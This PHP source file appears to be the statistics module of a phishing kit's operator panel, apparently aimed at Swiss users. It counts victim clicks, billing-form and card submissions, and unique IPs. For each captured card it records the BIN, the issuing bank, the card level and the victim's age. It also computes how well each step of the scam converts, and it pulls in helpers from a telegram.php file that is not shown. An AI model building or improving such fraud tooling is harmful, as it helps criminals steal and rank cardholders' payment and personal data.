<?php

declare(strict_types=1);

function panel_stats_path(): string
{
    return dirname(__DIR__, 2) . '/data/panel/stats.json';
}

function panel_stats_default(): array
{
    $today = (new DateTimeImmutable('now', new DateTimeZone('Europe/Zurich')))->format('Y-m-d');

    return [
        'clicks' => 0,
        'billing' => 0,
        'cartes' => 0,
        'today' => [
            'date' => $today,
            'unique_ips' => [],
        ],
        'last_card_at' => null,
        'cards' => [],
    ];
}

function panel_stats_read(): array
{
    $path = panel_stats_path();
    if (!is_file($path)) {
        return panel_stats_default();
    }

    $decoded = json_decode((string) file_get_contents($path), true);

    return is_array($decoded) ? array_merge(panel_stats_default(), $decoded) : panel_stats_default();
}

function panel_stats_write(array $stats): void
{
    $dir = dirname(panel_stats_path());
    if (!is_dir($dir)) {
        mkdir($dir, 0750, true);
    }

    $stats['today'] = is_array($stats['today'] ?? null) ? $stats['today'] : [];
    $stats['cards'] = is_array($stats['cards'] ?? null) ? $stats['cards'] : [];

    file_put_contents(
        panel_stats_path(),
        json_encode($stats, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT),
        LOCK_EX
    );
}

function panel_stats_mutate(callable $fn): void
{
    $stats = panel_stats_read();
    $fn($stats);
    panel_stats_write($stats);
}

function panel_stats_reset_today_if_needed(array &$stats): void
{
    $today = (new DateTimeImmutable('now', new DateTimeZone('Europe/Zurich')))->format('Y-m-d');
    if (!isset($stats['today']) || !is_array($stats['today'])) {
        $stats['today'] = ['date' => $today, 'unique_ips' => []];
    }
    if (($stats['today']['date'] ?? '') !== $today) {
        $stats['today'] = ['date' => $today, 'unique_ips' => []];
    }
    if (!is_array($stats['today']['unique_ips'] ?? null)) {
        $stats['today']['unique_ips'] = [];
    }
}

function panel_age_label(string $birthDate): string
{
    $birthDate = trim($birthDate);
    if ($birthDate === '') {
        return '—';
    }

    $tz = new DateTimeZone('Europe/Zurich');
    $dt = DateTimeImmutable::createFromFormat('d/m/Y', $birthDate, $tz)
        ?: DateTimeImmutable::createFromFormat('Y-m-d', $birthDate, $tz)
        ?: DateTimeImmutable::createFromFormat('d.m.Y', $birthDate, $tz);

    if ($dt === false) {
        return '—';
    }

    $age = (new DateTimeImmutable('now', $tz))->diff($dt)->y;

    return $age >= 0 ? $age . ' ans' : '—';
}

function panel_card_level(array $bin): string
{
    $type = strtolower(trim((string) ($bin['type'] ?? '')));
    if ($type === '') {
        return 'Classic';
    }

    return match ($type) {
        'credit' => 'Classic',
        'debit' => 'Debit',
        'prepaid' => 'Prepaid',
        default => ucfirst($type),
    };
}

function panel_level_class(string $level): string
{
    $key = strtolower($level);

    return match ($key) {
        'gold' => 'panel-card-row__level--gold',
        'platinum', 'plat' => 'panel-card-row__level--plat',
        default => '',
    };
}

function panel_stats_record_click(?string $ip = null): void
{
    if (!function_exists('client_ip')) {
        require_once __DIR__ . '/telegram.php';
    }

    $ip = $ip ?? client_ip();

    panel_stats_mutate(static function (array &$stats) use ($ip): void {
        $stats['clicks'] = (int) ($stats['clicks'] ?? 0) + 1;
        panel_stats_reset_today_if_needed($stats);
        if ($ip !== '—' && !in_array($ip, $stats['today']['unique_ips'], true)) {
            $stats['today']['unique_ips'][] = $ip;
        }
    });
}

function panel_stats_record_billing(array $data): void
{
    panel_stats_mutate(static function (array &$stats): void {
        $stats['billing'] = (int) ($stats['billing'] ?? 0) + 1;
    });
}

function panel_stats_record_card(array $data): void
{
    panel_stats_mutate(static function (array &$stats) use ($data): void {
        $stats['cartes'] = (int) ($stats['cartes'] ?? 0) + 1;
        panel_stats_append_card_row($stats, $data, true);
    });
}

function panel_stats_append_card_row(array &$stats, array $data, bool $fullCard): void
{
    if (!$fullCard) {
        return;
    }

    if (!function_exists('lookup_card_bin')) {
        require_once __DIR__ . '/telegram.php';
    }

    $digits = preg_replace('/\D/', '', (string) ($data['cardNumber'] ?? ''));
    $binDigits = strlen($digits) >= 6 ? substr($digits, 0, 6) : '—';
    $bin = lookup_card_bin($digits);
    $level = panel_card_level($bin);
    $tz = new DateTimeZone('Europe/Zurich');
    $now = new DateTimeImmutable('now', $tz);

    $row = [
        'bin' => $binDigits,
        'age' => panel_age_label((string) ($data['birthDate'] ?? '')),
        'bank' => ($bin['bank'] ?? '—') === '—' ? '—' : $bin['bank'],
        'level' => $level,
        'level_class' => panel_level_class($level),
        'at' => $now->format(DateTimeInterface::ATOM),
    ];

    $cards = is_array($stats['cards'] ?? null) ? $stats['cards'] : [];
    array_unshift($cards, $row);
    $stats['cards'] = array_slice($cards, 0, 200);
    $stats['last_card_at'] = $now->format('H:i');
}

function panel_stats_reset_all(): void
{
    panel_stats_write(panel_stats_default());
}

function panel_stats_payload(): array
{
    $stats = panel_stats_read();
    panel_stats_reset_today_if_needed($stats);

    $clicks = (int) ($stats['clicks'] ?? 0);
    $billing = (int) ($stats['billing'] ?? 0);
    $cartes = (int) ($stats['cartes'] ?? 0);
    $clicsSeuls = max(0, $clicks - $billing - $cartes);

    $pct = static function (int $part, int $total): float {
        return $total > 0 ? round(($part / $total) * 100, 1) : 0.0;
    };

    return [
        'clicks' => $clicks,
        'billing' => $billing,
        'cartes' => $cartes,
        'clics_seuls' => $clicsSeuls,
        'unique_today' => count($stats['today']['unique_ips'] ?? []),
        'last_card_at' => $stats['last_card_at'] ?? '—',
        'conversion' => [
            'click_billing' => $pct($billing, $clicks),
            'billing_cartes' => $pct($cartes, $billing),
            'click_cartes' => $pct($cartes, $clicks),
        ],
        'pie' => [
            'cartes' => $cartes,
            'billing' => $billing,
            'clics' => $clicsSeuls,
            'total' => $clicks,
        ],
        'cards' => $stats['cards'] ?? [],
    ];
}
